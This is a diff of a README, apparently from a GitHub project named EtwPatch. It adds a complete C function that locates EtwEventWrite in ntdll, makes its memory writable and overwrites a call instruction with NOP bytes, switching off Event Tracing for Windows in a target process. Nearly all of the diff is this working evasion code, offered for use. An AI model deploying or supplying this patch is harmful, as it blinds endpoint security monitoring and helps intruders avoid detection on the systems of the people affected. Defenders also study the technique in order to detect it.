@@ -13,6 +13,46 @@
   
 ![EtwPatch](https://user-images.githubusercontent.com/110354855/198856224-12901961-150b-4116-946f-ad149705dc96.png)
 
+### Here is the full Patch function :  
+```c
+void patchEtwpEventWriteFull(OUT HANDLE& hProc) {
 
+    void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
 
+    for (BYTE offset = 0; offset <= 100; offset++) {
+        if (*((PBYTE)etwAddr + offset) == 0xe8 && *((PBYTE)etwAddr + offset + 9) == 0xc3) {
+            char etwPatch[] = { 0x90, 0x90, 0x90, 0x90, 0x90 };
+
+            DWORD lpflOldProtect = 0;
+            unsigned __int64 memPage = 0x1000;
+            void* etwAddr_bk = (void*)(((INT_PTR)etwAddr + offset));;
+
+            NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+            if (!NT_SUCCESS(NtProtectStatus1)) {
+                printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
+                return;
+            }
+
+            NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hProc, (LPVOID)((INT_PTR)etwAddr + offset), (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
+            if (!NT_SUCCESS(NtWriteStatus)) {
+                printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
+                return;
+            }
+
+            NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+            if (!NT_SUCCESS(NtProtectStatus2)) {
+                printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
+                return;
+            }
+        }
+        if (*((PBYTE)etwAddr + offset) == 0xc3) {
+            break;
+        }
+    }
+    
+
+    std::cout << "[+] Patched etw!\n";
+
+}
+```
 
